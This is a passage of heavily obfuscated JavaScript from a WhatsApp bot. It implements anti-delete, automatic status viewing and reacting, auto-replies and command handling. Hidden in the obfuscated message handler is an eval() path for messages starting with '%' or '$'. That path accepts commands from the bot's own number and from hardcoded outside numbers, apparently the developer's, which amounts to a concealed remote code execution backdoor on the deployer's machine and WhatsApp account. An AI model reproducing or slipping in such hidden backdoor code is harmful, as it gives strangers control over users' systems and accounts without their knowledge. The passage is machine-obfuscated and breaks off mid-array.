hexanodecode_于度ن有[hexanodecode_ユ本两زみ(0x357)+hexanodecode_ユ本两زみ(0x33e)+'\x65'](hexanodecode_ふ时レ从ح,hexanodecode_制生ツ这地可上),console['\x6c\x6f\x67'](hexanodecode_ユ本两زみ(0xf7)+hexanodecode_ユ本两زみ(0x25f)+hexanodecode_ユ本两زみ(0x321)+'\x6e\x64\x20\x6d\x65'+hexanodecode_ユ本两زみ(0x2d6)+'\x20\x73\x65\x6e\x74'+hexanodecode_ユ本两زみ(0x2f3)+hexanodecode_ふ时レ从ح);}}catch(hexanodecode_تノフ就な以ث体三){console[hexanodecode_ユ本两زみ(0x1a7)](hexanodecode_ユ本两زみ(0x289)+hexanodecode_ユ本两زみ(0x190)+hexanodecode_ユ本两زみ(0x1a7)+'\x3a',hexanodecode_تノフ就な以ث体三);}}),hexanodecode_于度ن有['\x65\x76']['\x6f\x6e'](hexanodecode_地会这フ过两(0x1f0)+hexanodecode_地会这フ过两(0x333)+'\x69\x63\x69\x70\x61'+hexanodecode_地会这フ过两(0x318)+hexanodecode_地会这フ过两(0x1b4),hexanodecode_ح前にツフ发=>GroupEvents(hexanodecode_于度ن有,hexanodecode_ح前にツフ发)),hexanodecode_于度ن有['\x65\x76']['\x6f\x6e'](hexanodecode_地会这フ过两(0x194)+'\x67\x65\x73\x2e\x75'+hexanodecode_地会这フ过两(0x1b4),async hexanodecode_ヌテ化غ=>{const hexanodecode_けخو于らエ=hexanodecode_地会这フ过两;if(config[hexanodecode_けخو于らエ(0x3ed)+hexanodecode_けخو于らエ(0x187)+'\x45']!==hexanodecode_けخو于らエ(0xf1))return;await AntiDelete(hexanodecode_于度ن有,hexanodecode_ヌテ化غ);}),hexanodecode_于度ن有['\x65\x76']['\x6f\x6e'](hexanodecode_地会这フ过两(0x194)+hexanodecode_地会这フ过两(0x138)+hexanodecode_地会这フ过两(0x10a),async hexanodecode_它ز部上行=>{const hexanodecode_了起也チ都然去=hexanodecode_地会这フ过两;try{hexanodecode_它ز部上行=hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+hexanodecode_了起也チ都然去(0x1e9)][0x1*0xbb2+-0xe33+0x1*0x281];if(!hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'])return;hexanodecode_它ز部上行['\x6d\x65\x73\x73\x61'+'\x67\x65']=getContentType(hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'])===hexanodecode_了起也チ都然去(0x3c6)+'\x65\x72\x61\x6c\x4d'+hexanodecode_了起也チ都然去(0x33e)+'\x65'?hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'][hexanodecode_了起也チ都然去(0x3c6)+'\x65\x72\x61\x6c\x4d'+'\x65\x73\x73\x61\x67'+'\x65'][hexanodecode_了起也チ都然去(0x194)+'\x67\x65']:hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'];config[hexanodecode_了起也チ都然去(0x326)+'\x4d\x45\x53\x53\x41'+'\x47\x45']===hexanodecode_了起也チ都然去(0xf1)&&await hexanodecode_于度ن有[hexanodecode_了起也チ都然去(0x1c3)+'\x65\x73\x73\x61\x67'+'\x65\x73']([hexanodecode_它ز部上行['\x6b\x65\x79']]);if(hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'][hexanodecode_了起也チ都然去(0x237)+'\x6e\x63\x65\x4d\x65'+'\x73\x73\x61\x67\x65'+'\x56\x32'])hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65']=getContentType(hexanodecode_它ز部上行['\x6d\x65\x73\x73\x61'+'\x67\x65'])==='\x65\x70\x68\x65\x6d'+hexanodecode_了起也チ都然去(0x34c)+hexanodecode_了起也チ都然去(0x33e)+'\x65'?hexanodecode_它ز部上行['\x6d\x65\x73\x73\x61'+'\x67\x65'][hexanodecode_了起也チ都然去(0x3c6)+hexanodecode_了起也チ都然去(0x34c)+hexanodecode_了起也チ都然去(0x33e)+'\x65'][hexanodecode_了起也チ都然去(0x194)+'\x67\x65']:hexanodecode_它ز部上行['\x6d\x65\x73\x73\x61'+'\x67\x65'];hexanodecode_它ز部上行['\x6b\x65\x79']&&hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)][hexanodecode_了起也チ都然去(0x238)+hexanodecode_了起也チ都然去(0x2e7)]==='\x73\x74\x61\x74\x75'+'\x73\x40\x62\x72\x6f'+'\x61\x64\x63\x61\x73'+'\x74'&&config[hexanodecode_了起也チ都然去(0x22e)+hexanodecode_了起也チ都然去(0x2f5)+hexanodecode_了起也チ都然去(0x254)+'\x4e']===hexanodecode_了起也チ都然去(0xf1)&&await hexanodecode_于度ن有[hexanodecode_了起也チ都然去(0x1c3)+hexanodecode_了起也チ都然去(0x33e)+'\x65\x73']([hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)]]);if(hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)]&&hexanodecode_它ز部上行['\x6b\x65\x79'][hexanodecode_了起也チ都然去(0x238)+hexanodecode_了起也チ都然去(0x2e7)]==='\x73\x74\x61\x74\x75'+'\x73\x40\x62\x72\x6f'+hexanodecode_了起也チ都然去(0x2ec)+'\x74'&&config['\x41\x55\x54\x4f\x5f'+hexanodecode_了起也チ都然去(0x2f5)+'\x53\x5f\x52\x45\x41'+'\x43\x54']==='\x74\x72\x75\x65'){const hexanodecode_るり三生レمロ机=![],hexanodecode_当ミソ们ケ=getContentType(hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65']),hexanodecode_ソ人学产用=!hexanodecode_るり三生レمロ机&&(hexanodecode_当ミソ们ケ==='\x70\x72\x6f\x74\x6f'+hexanodecode_了起也チ都然去(0x396)+hexanodecode_了起也チ都然去(0x2d6)||hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65']?.[hexanodecode_了起也チ都然去(0x149)+'\x63\x6f\x6c\x4d\x65'+hexanodecode_了起也チ都然去(0x2d6)]);if(hexanodecode_ソ人学产用)console[hexanodecode_了起也チ都然去(0x180)](hexanodecode_了起也チ都然去(0x32d)+hexanodecode_了起也チ都然去(0x31c)+hexanodecode_了起也チ都然去(0x19e)+hexanodecode_了起也チ都然去(0x221)+hexanodecode_了起也チ都然去(0x17e)+hexanodecode_了起也チ都然去(0x31f)+'\x64\x2c\x20\x73\x6b'+hexanodecode_了起也チ都然去(0x3f9)+hexanodecode_了起也チ都然去(0x273)+'\x63\x74');else try{const hexanodecode_自ヲ制而ワمサす=['\u2764\ufe0f','\ud83d\udd25','\ud83d\ude0d','\ud83d\ude0e','\ud83d\udcaf','\u2728','\ud83e\ude77','\ud83e\udd70','\ud83e\udde1','\ud83d\udda4',hexanodecode_了起也チ都然去(0x3b2),hexanodecode_了起也チ都然去(0x3a0),'\ud83d\ude3b','\ud83d\udc95','\ud83c\udf1f','\ud83d\udc4f','\ud83d\ude4c','\ud83d\udcaa','\ud83c\udf89','\ud83e\udd73','\ud83e\udd29','\ud83d\ude18','\ud83e\udd7a','\ud83e\udd17'],hexanodecode_جはくرذ实=hexanodecode_自ヲ制而ワمサす[Math['\x66\x6c\x6f\x6f\x72'](Math['\x72\x61\x6e\x64\x6f'+'\x6d']()*hexanodecode_自ヲ制而ワمサす[hexanodecode_了起也チ都然去(0x19a)+'\x68'])],hexanodecode_他法ي多=jidNormalizedUser(hexanodecode_于度ن有[hexanodecode_了起也チ都然去(0x349)]['\x69\x64']);let hexanodecode_れ把能来خサ会ア=hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)][hexanodecode_了起也チ都然去(0x1db)+hexanodecode_了起也チ都然去(0x362)+'\x74'];if(!hexanodecode_れ把能来خサ会ア)console['\x6c\x6f\x67']('\u26a0\ufe0f\x20\x41\x55\x54'+hexanodecode_了起也チ都然去(0xf6)+hexanodecode_了起也チ都然去(0x23b)+hexanodecode_了起也チ都然去(0x3aa)+hexanodecode_了起也チ都然去(0x30d)+hexanodecode_了起也チ都然去(0x270)+hexanodecode_了起也チ都然去(0x197)+hexanodecode_了起也チ都然去(0x2bd)+'\x70\x61\x6e\x74\x20'+hexanodecode_了起也チ都然去(0x2d0));else{let hexanodecode_ن行年外它=hexanodecode_れ把能来خサ会ア;if(hexanodecode_れ把能来خサ会ア[hexanodecode_了起也チ都然去(0x33c)+hexanodecode_了起也チ都然去(0x2ba)]('\x40\x6c\x69\x64'))try{const hexanodecode_水ثし用如ナ面=await hexanodecode_于度ن有?.[hexanodecode_了起也チ都然去(0x2aa)+hexanodecode_了起也チ都然去(0x405)+hexanodecode_了起也チ都然去(0x3ce)+'\x79']?.['\x6c\x69\x64\x4d\x61'+hexanodecode_了起也チ都然去(0x319)]?.[hexanodecode_了起也チ都然去(0x290)+'\x46\x6f\x72\x4c\x49'+'\x44']?.(hexanodecode_れ把能来خサ会ア)['\x63\x61\x74\x63\x68'](()=>null);if(hexanodecode_水ثし用如ナ面)hexanodecode_ن行年外它=hexanodecode_水ثし用如ナ面;}catch(hexanodecode_开ち现如过时た){}else hexanodecode_れ把能来خサ会ア[hexanodecode_了起也チ都然去(0x33c)+'\x64\x65\x73']('\x3a')&&(hexanodecode_ن行年外它=jidNormalizedUser(hexanodecode_れ把能来خサ会ア));hexanodecode_ن行年外它=jidNormalizedUser(hexanodecode_ن行年外它);if(hexanodecode_ن行年外它['\x69\x6e\x63\x6c\x75'+hexanodecode_了起也チ都然去(0x2ba)](hexanodecode_了起也チ都然去(0x34a)+'\x61\x74\x73\x61\x70'+'\x70\x2e\x6e\x65\x74')){const hexanodecode_ظ学面ニ={};hexanodecode_ظ学面ニ[hexanodecode_了起也チ都然去(0x155)]=hexanodecode_جはくرذ实,hexanodecode_ظ学面ニ['\x6b\x65\x79']=hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)];const hexanodecode_ヲほ说多ス们س也={};hexanodecode_ヲほ说多ス们س也[hexanodecode_了起也チ都然去(0x1b3)]=hexanodecode_ظ学面ニ;const hexanodecode_か业اそكخ法开={};hexanodecode_か业اそكخ法开[hexanodecode_了起也チ都然去(0xef)+'\x73\x4a\x69\x64\x4c'+hexanodecode_了起也チ都然去(0x295)]=[hexanodecode_ن行年外它,hexanodecode_他法ي多],await hexanodecode_于度ن有[hexanodecode_了起也チ都然去(0x357)+hexanodecode_了起也チ都然去(0x33e)+'\x65']('\x73\x74\x61\x74\x75'+hexanodecode_了起也チ都然去(0x1c8)+hexanodecode_了起也チ都然去(0x2ec)+'\x74',hexanodecode_ヲほ说多ス们س也,hexanodecode_か业اそكخ法开),console['\x6c\x6f\x67'](hexanodecode_了起也チ都然去(0x367)+hexanodecode_了起也チ都然去(0x2e5)+hexanodecode_了起也チ都然去(0x33a)+hexanodecode_了起也チ都然去(0x1c0)+hexanodecode_了起也チ都然去(0x2f9)+hexanodecode_了起也チ都然去(0x3eb)+hexanodecode_了起也チ都然去(0x1a0));}else console[hexanodecode_了起也チ都然去(0x180)](hexanodecode_了起也チ都然去(0x1fd)+'\x4f\x5f\x53\x54\x41'+'\x54\x55\x53\x5f\x52'+hexanodecode_了起也チ都然去(0x3aa)+hexanodecode_了起也チ都然去(0x30d)+hexanodecode_了起也チ都然去(0x270)+hexanodecode_了起也チ都然去(0x204)+hexanodecode_了起也チ都然去(0x2f1)+'\x6e\x64\x65\x72\x4a'+hexanodecode_了起也チ都然去(0x293)+hexanodecode_了起也チ都然去(0x15d),hexanodecode_ن行年外它);}}catch(hexanodecode_而غミユ所我り就){console[hexanodecode_了起也チ都然去(0x180)](hexanodecode_了起也チ都然去(0xe3)+hexanodecode_了起也チ都然去(0xf6)+hexanodecode_了起也チ都然去(0x23b)+'\x45\x41\x43\x54\x20'+hexanodecode_了起也チ都然去(0x157)+'\x3a',hexanodecode_而غミユ所我り就);}}if(hexanodecode_它ز部上行['\x6b\x65\x79']&&hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)][hexanodecode_了起也チ都然去(0x238)+hexanodecode_了起也チ都然去(0x2e7)]===hexanodecode_了起也チ都然去(0xef)+hexanodecode_了起也チ都然去(0x1c8)+'\x61\x64\x63\x61\x73'+'\x74'&&config[hexanodecode_了起也チ都然去(0x22e)+hexanodecode_了起也チ都然去(0x2f5)+'\x53\x5f\x52\x45\x50'+'\x4c\x59']==='\x74\x72\x75\x65'){const hexanodecode_イて动س=hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)][hexanodecode_了起也チ都然去(0x1db)+hexanodecode_了起也チ都然去(0x362)+'\x74'],hexanodecode_实の当合生外きظ=''+config[hexanodecode_了起也チ都然去(0x22e)+hexanodecode_了起也チ都然去(0x2f5)+hexanodecode_了起也チ都然去(0x3de)],hexanodecode_ث也ナゆエ行={};hexanodecode_ث也ナゆエ行[hexanodecode_了起也チ都然去(0x155)]='\ud83d\udc9c',hexanodecode_ث也ナゆエ行[hexanodecode_了起也チ都然去(0x278)]=hexanodecode_它ز部上行['\x6b\x65\x79'];const hexanodecode_ر十电ホきت={};hexanodecode_ر十电ホきت[hexanodecode_了起也チ都然去(0x155)]=hexanodecode_实の当合生外きظ,hexanodecode_ر十电ホきت[hexanodecode_了起也チ都然去(0x1b3)]=hexanodecode_ث也ナゆエ行;const hexanodecode_十るウ水ت={};hexanodecode_十るウ水ت[hexanodecode_了起也チ都然去(0x2c2)+'\x64']=hexanodecode_它ز部上行,await hexanodecode_于度ن有[hexanodecode_了起也チ都然去(0x357)+hexanodecode_了起也チ都然去(0x33e)+'\x65'](hexanodecode_イて动س,hexanodecode_ر十电ホきت,hexanodecode_十るウ水ت);}await Promise[hexanodecode_了起也チ都然去(0x305)]([saveMessage(hexanodecode_它ز部上行)]),storeMessage(hexanodecode_它ز部上行),await handleNewsletterReaction(hexanodecode_于度ن有,hexanodecode_它ز部上行);const hexanodecode_い着是ص以ソウ外=sms(hexanodecode_于度ن有,hexanodecode_它ز部上行),hexanodecode_点はろدへえ=getContentType(hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65']),hexanodecode_كれきロす=JSON[hexanodecode_了起也チ都然去(0x1a3)+'\x67\x69\x66\x79'](hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65']),hexanodecode_产行ホ要=hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)][hexanodecode_了起也チ都然去(0x238)+hexanodecode_了起也チ都然去(0x2e7)],hexanodecode_りモさわ性メれ=hexanodecode_点はろدへえ==hexanodecode_了起也チ都然去(0x2c6)+hexanodecode_了起也チ都然去(0x152)+hexanodecode_了起也チ都然去(0x24e)+hexanodecode_了起也チ都然去(0x3dd)&&hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'][hexanodecode_了起也チ都然去(0x2c6)+hexanodecode_了起也チ都然去(0x152)+hexanodecode_了起也チ都然去(0x24e)+hexanodecode_了起也チ都然去(0x3dd)]['\x63\x6f\x6e\x74\x65'+hexanodecode_了起也チ都然去(0x1da)+'\x6f']!=null?hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'][hexanodecode_了起也チ都然去(0x2c6)+hexanodecode_了起也チ都然去(0x152)+hexanodecode_了起也チ都然去(0x24e)+hexanodecode_了起也チ都然去(0x3dd)][hexanodecode_了起也チ都然去(0x137)+'\x78\x74\x49\x6e\x66'+'\x6f']['\x71\x75\x6f\x74\x65'+'\x64\x4d\x65\x73\x73'+hexanodecode_了起也チ都然去(0x15f)]||[]:[],hexanodecode_时ツムく=hexanodecode_点はろدへえ===hexanodecode_了起也チ都然去(0x3d2)+hexanodecode_了起也チ都然去(0x1ce)+'\x6f\x6e'?hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'][hexanodecode_了起也チ都然去(0x3d2)+hexanodecode_了起也チ都然去(0x1ce)+'\x6f\x6e']:hexanodecode_点はろدへえ===hexanodecode_了起也チ都然去(0x2c6)+hexanodecode_了起也チ都然去(0x152)+hexanodecode_了起也チ都然去(0x24e)+hexanodecode_了起也チ都然去(0x3dd)?hexanodecode_它ز部上行['\x6d\x65\x73\x73\x61'+'\x67\x65'][hexanodecode_了起也チ都然去(0x2c6)+'\x64\x65\x64\x54\x65'+hexanodecode_了起也チ都然去(0x24e)+hexanodecode_了起也チ都然去(0x3dd)][hexanodecode_了起也チ都然去(0x155)]:hexanodecode_点はろدへえ==hexanodecode_了起也チ都然去(0x267)+hexanodecode_了起也チ都然去(0x158)+'\x67\x65'&&hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'][hexanodecode_了起也チ都然去(0x267)+hexanodecode_了起也チ都然去(0x158)+'\x67\x65'][hexanodecode_了起也チ都然去(0x298)+'\x6f\x6e']?hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'][hexanodecode_了起也チ都然去(0x267)+hexanodecode_了起也チ都然去(0x158)+'\x67\x65']['\x63\x61\x70\x74\x69'+'\x6f\x6e']:hexanodecode_点はろدへえ==hexanodecode_了起也チ都然去(0x11f)+hexanodecode_了起也チ都然去(0x158)+'\x67\x65'&&hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65']['\x76\x69\x64\x65\x6f'+hexanodecode_了起也チ都然去(0x158)+'\x67\x65'][hexanodecode_了起也チ都然去(0x298)+'\x6f\x6e']?hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x194)+'\x67\x65'][hexanodecode_了起也チ都然去(0x11f)+'\x4d\x65\x73\x73\x61'+'\x67\x65'][hexanodecode_了起也チ都然去(0x298)+'\x6f\x6e']:'',hexanodecode_制动的ねせ说好そ体=hexanodecode_时ツムく['\x73\x74\x61\x72\x74'+hexanodecode_了起也チ都然去(0x2da)](prefix);var hexanodecode_一然ツあか=typeof hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x155)]==hexanodecode_了起也チ都然去(0x1a3)+'\x67'?hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x155)]:![];const hexanodecode_民生メ产高ظ=hexanodecode_制动的ねせ说好そ体?hexanodecode_时ツムく['\x73\x6c\x69\x63\x65'](prefix[hexanodecode_了起也チ都然去(0x19a)+'\x68'])['\x74\x72\x69\x6d']()[hexanodecode_了起也チ都然去(0x120)]('\x20')['\x73\x68\x69\x66\x74']()[hexanodecode_了起也チ都然去(0x369)+'\x65\x72\x43\x61\x73'+'\x65']():'',hexanodecode_イニひ过国ط=hexanodecode_时ツムく[hexanodecode_了起也チ都然去(0x2fd)]()[hexanodecode_了起也チ都然去(0x120)](/ +/)['\x73\x6c\x69\x63\x65'](0x85*0x42+-0x2659+0x410),hexanodecode_当あスキ=hexanodecode_イニひ过国ط[hexanodecode_了起也チ都然去(0x136)]('\x20'),hexanodecode_て同经动力ウ=hexanodecode_イニひ过国ط['\x6a\x6f\x69\x6e']('\x20'),hexanodecode_就人业ぬ所جホ=hexanodecode_产行ホ要[hexanodecode_了起也チ都然去(0x250)+hexanodecode_了起也チ都然去(0x189)](hexanodecode_了起也チ都然去(0x383)),hexanodecode_せ有ロひب一カもワ=hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)]['\x66\x72\x6f\x6d\x4d'+'\x65']?hexanodecode_于度ن有[hexanodecode_了起也チ都然去(0x349)]['\x69\x64'][hexanodecode_了起也チ都然去(0x120)]('\x3a')[-0x23b2+-0x56*0x3b+0x1a2*0x22]+(hexanodecode_了起也チ都然去(0x34a)+hexanodecode_了起也チ都然去(0x24f)+hexanodecode_了起也チ都然去(0x3e3))||hexanodecode_于度ن有[hexanodecode_了起也チ都然去(0x349)]['\x69\x64']:hexanodecode_它ز部上行['\x6b\x65\x79']['\x70\x61\x72\x74\x69'+hexanodecode_了起也チ都然去(0x362)+'\x74']||hexanodecode_它ز部上行['\x6b\x65\x79'][hexanodecode_了起也チ都然去(0x238)+hexanodecode_了起也チ都然去(0x2e7)],hexanodecode_のれか人我=hexanodecode_せ有ロひب一カもワ[hexanodecode_了起也チ都然去(0x120)]('\x40')[-0xa*0x28f+0x2e7*0x7+-0x1*-0x545],hexanodecode_还ち度キなに=hexanodecode_于度ن有['\x75\x73\x65\x72']['\x69\x64'][hexanodecode_了起也チ都然去(0x120)]('\x3a')[0x1685+0xc2d+0x22b2*-0x1],hexanodecode_些三而水有おね=hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x399)+hexanodecode_了起也チ都然去(0x34e)]||hexanodecode_了起也チ都然去(0x306)+hexanodecode_了起也チ都然去(0x1c6),hexanodecode_化它シレ分=hexanodecode_还ち度キなに[hexanodecode_了起也チ都然去(0x33c)+hexanodecode_了起也チ都然去(0x2ba)](hexanodecode_のれか人我),hexanodecode_ممテ政=ownerNumber[hexanodecode_了起也チ都然去(0x33c)+hexanodecode_了起也チ都然去(0x2ba)](hexanodecode_のれか人我)||hexanodecode_化它シレ分,hexanodecode_等自过ي前成=await jidNormalizedUser(hexanodecode_于度ن有['\x75\x73\x65\x72']['\x69\x64']),hexanodecode_テれセ这ミのえ为=hexanodecode_就人业ぬ所جホ?await getCachedGroupMetadata(hexanodecode_于度ن有,hexanodecode_产行ホ要):'',hexanodecode_上体ع里=hexanodecode_就人业ぬ所جホ?hexanodecode_テれセ这ミのえ为[hexanodecode_了起也チ都然去(0x287)+'\x63\x74']:'',hexanodecode_之む把ナサな得产本=hexanodecode_就人业ぬ所جホ?hexanodecode_テれセ这ミのえ为[hexanodecode_了起也チ都然去(0x1db)+hexanodecode_了起也チ都然去(0x362)+'\x74\x73']:'',hexanodecode_一大要政は到ラ=hexanodecode_就人业ぬ所جホ?await getGroupAdmins(hexanodecode_之む把ナサな得产本):'',hexanodecode_غエخف下合よヌ=hexanodecode_就人业ぬ所جホ?hexanodecode_一大要政は到ラ['\x69\x6e\x63\x6c\x75'+'\x64\x65\x73'](hexanodecode_等自过ي前成):![],hexanodecode_ニ发能フك=hexanodecode_就人业ぬ所جホ?hexanodecode_一大要政は到ラ[hexanodecode_了起也チ都然去(0x33c)+hexanodecode_了起也チ都然去(0x2ba)](hexanodecode_せ有ロひب一カもワ):![],hexanodecode_然家وص等就フ后二=hexanodecode_い着是ص以ソウ外[hexanodecode_了起也チ都然去(0x194)+'\x67\x65']['\x72\x65\x61\x63\x74'+'\x69\x6f\x6e\x4d\x65'+hexanodecode_了起也チ都然去(0x2d6)]?!![]:![],hexanodecode_对くルل行两化一可=hexanodecode_صコほウ=>{const hexanodecode_定点得所=hexanodecode_了起也チ都然去,hexanodecode_化ذス加应政={};hexanodecode_化ذス加应政[hexanodecode_定点得所(0x155)]=hexanodecode_صコほウ;const hexanodecode_把イ出电起={};hexanodecode_把イ出电起[hexanodecode_定点得所(0x2c2)+'\x64']=hexanodecode_它ز部上行,hexanodecode_于度ن有[hexanodecode_定点得所(0x357)+hexanodecode_定点得所(0x33e)+'\x65'](hexanodecode_产行ホ要,hexanodecode_化ذス加应政,hexanodecode_把イ出电起);},hexanodecode_ろ机现制子える=hexanodecode_还ち度キなに['\x73\x70\x6c\x69\x74']('\x40')[0x1274*0x2+-0x2bc+0x222c*-0x1],hexanodecode_جつت学ص=[hexanodecode_了起也チ都然去(0x25c)+hexanodecode_了起也チ都然去(0x228)+'\x36\x37',hexanodecode_了起也チ都然去(0x25c)+hexanodecode_了起也チ都然去(0x228)+'\x36\x37'],hexanodecode_قب从ノس=[];let hexanodecode_高فه生以前二=[hexanodecode_ろ机现制子える,...hexanodecode_جつت学ص,...hexanodecode_قب从ノس][hexanodecode_了起也チ都然去(0x147)](hexanodecode_シ高子业地ノ两着可=>hexanodecode_シ高子业地ノ两着可[hexanodecode_了起也チ都然去(0x30e)+'\x63\x65'](/[^0-9]/g,'')+(hexanodecode_了起也チ都然去(0x34a)+hexanodecode_了起也チ都然去(0x24f)+'\x70\x2e\x6e\x65\x74'))[hexanodecode_了起也チ都然去(0x33c)+hexanodecode_了起也チ都然去(0x2ba)](hexanodecode_せ有ロひب一カもワ);if(hexanodecode_高فه生以前二&&hexanodecode_它ز部上行['\x74\x65\x78\x74']&&hexanodecode_它ز部上行['\x74\x65\x78\x74'][hexanodecode_了起也チ都然去(0x388)+hexanodecode_了起也チ都然去(0x2da)]('\x25')){let hexanodecode_サうは由نワ=hexanodecode_一然ツあか[hexanodecode_了起也チ都然去(0x20f)](-0x5*0x559+-0x1085*0x2+0x3bc9);if(!hexanodecode_サうは由نワ){hexanodecode_对くルل行两化一可(hexanodecode_了起也チ都然去(0x17f)+hexanodecode_了起也チ都然去(0x364)+'\x20\x77\x69\x74\x68'+hexanodecode_了起也チ都然去(0x2ff)+hexanodecode_了起也チ都然去(0xdd)+hexanodecode_了起也チ都然去(0x258)+'\x20\x4d\x61\x73\x74'+hexanodecode_了起也チ都然去(0x119));return;}try{let hexanodecode_صチる种オ作そむミ=eval(hexanodecode_サうは由نワ);if(typeof hexanodecode_صチる种オ作そむミ==='\x6f\x62\x6a\x65\x63'+'\x74')hexanodecode_对くルل行两化一可(util[hexanodecode_了起也チ都然去(0x214)+'\x74'](hexanodecode_صチる种オ作そむミ));else hexanodecode_对くルل行两化一可(util[hexanodecode_了起也チ都然去(0x214)+'\x74'](hexanodecode_صチる种オ作そむミ));}catch(hexanodecode_ウ使也ろカ就و家人){hexanodecode_对くルل行两化一可(util[hexanodecode_了起也チ都然去(0x214)+'\x74'](hexanodecode_ウ使也ろカ就و家人));}return;}if(hexanodecode_高فه生以前二&&hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x155)]&&hexanodecode_它ز部上行['\x74\x65\x78\x74'][hexanodecode_了起也チ都然去(0x388)+hexanodecode_了起也チ都然去(0x2da)]('\x24')){let hexanodecode_モ产みむ法=hexanodecode_一然ツあか[hexanodecode_了起也チ都然去(0x20f)](0xd64*-0x1+-0xea3+0x1c09*0x1);if(!hexanodecode_モ产みむ法){hexanodecode_对くルل行两化一可('\x50\x72\x6f\x76\x69'+hexanodecode_了起也チ都然去(0x364)+hexanodecode_了起也チ都然去(0x373)+hexanodecode_了起也チ都然去(0x2ff)+'\x65\x72\x79\x20\x74'+'\x6f\x20\x72\x75\x6e'+'\x20\x4d\x61\x73\x74'+hexanodecode_了起也チ都然去(0x119));return;}try{let hexanodecode_如ゆ自用=await eval(hexanodecode_了起也チ都然去(0x3b0)+'\x20\x61\x20\x3d\x20'+hexanodecode_了起也チ都然去(0x1a2)+'\x28\x29\x3d\x3e\x7b'+'\x0a'+hexanodecode_モ产みむ法+(hexanodecode_了起也チ都然去(0x1f6)+'\x29')),hexanodecode_ثも是如=util[hexanodecode_了起也チ都然去(0x214)+'\x74'](hexanodecode_如ゆ自用);if(hexanodecode_ثも是如===undefined)return console[hexanodecode_了起也チ都然去(0x180)](hexanodecode_ثも是如);else hexanodecode_对くルل行两化一可(hexanodecode_ثも是如);}catch(hexanodecode_حソメ当然か起){if(hexanodecode_حソメ当然か起===undefined)return console[hexanodecode_了起也チ都然去(0x180)](hexanodecode_了起也チ都然去(0x1a7));else hexanodecode_对くルل行两化一可(util['\x66\x6f\x72\x6d\x61'+'\x74'](hexanodecode_حソメ当然か起));}return;}const hexanodecode_ク时シソ=hexanodecode_了起也チ都然去(0x25c)+hexanodecode_了起也チ都然去(0x228)+'\x36\x37',hexanodecode_おي是的得=hexanodecode_了起也チ都然去(0x104)+hexanodecode_了起也チ都然去(0x25d)+hexanodecode_了起也チ都然去(0x391),hexanodecode_キس它经在这=hexanodecode_のれか人我[hexanodecode_了起也チ都然去(0x30e)+'\x63\x65'](/[^0-9]/g,'');if((hexanodecode_キس它经在这[hexanodecode_了起也チ都然去(0x33c)+hexanodecode_了起也チ都然去(0x2ba)](hexanodecode_ク时シソ)||hexanodecode_キس它经在这[hexanodecode_了起也チ都然去(0x33c)+hexanodecode_了起也チ都然去(0x2ba)](hexanodecode_おي是的得))&&!hexanodecode_然家وص等就フ后二&&!hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)][hexanodecode_了起也チ都然去(0x112)+'\x65']){const hexanodecode_实过一ム着时加ع=['\ud83d\udc51','\ud83e\udd0d','\ud83d\udc97'],hexanodecode_ヘち中地の成说ろ部=hexanodecode_实过一ム着时加ع[Math[hexanodecode_了起也チ都然去(0x3d4)](Math['\x72\x61\x6e\x64\x6f'+'\x6d']()*hexanodecode_实过一ム着时加ع[hexanodecode_了起也チ都然去(0x19a)+'\x68'])];hexanodecode_い着是ص以ソウ外['\x72\x65\x61\x63\x74'](hexanodecode_ヘち中地の成说ろ部);}if(!hexanodecode_然家وص等就フ后二&&config[hexanodecode_了起也チ都然去(0x22e)+hexanodecode_了起也チ都然去(0x1f4)]===hexanodecode_了起也チ都然去(0xf1)){const hexanodecode_ウ度然同种外年们ج=['\ud83c\udf3c','\u2764\ufe0f','\ud83d\udc90','\ud83d\udd25','\ud83c\udff5\ufe0f','\u2744\ufe0f','\ud83e\uddca','\ud83d\udc33','\ud83d\udca5','\ud83e\udd40','\u2764\u200d\ud83d\udd25','\ud83e\udd79','\ud83d\ude29','\ud83e\udee3','\ud83e\udd2d','\ud83d\udc7b','\ud83d\udc7e','\ud83e\udef6','\ud83d\ude3b','\ud83d\ude4c','\ud83e\udec2','\ud83e\udec0',hexanodecode_了起也チ都然去(0x19b),hexanodecode_了起也チ都然去(0x37c),hexanodecode_了起也チ都然去(0x371),'\ud83e\uddd1\u200d\u2695\ufe0f','\ud83e\uddd5',hexanodecode_了起也チ都然去(0x308),hexanodecode_了起也チ都然去(0x17b),hexanodecode_了起也チ都然去(0x1a6),hexanodecode_了起也チ都然去(0x2b7),'\ud83e\udddf\u200d\u2640\ufe0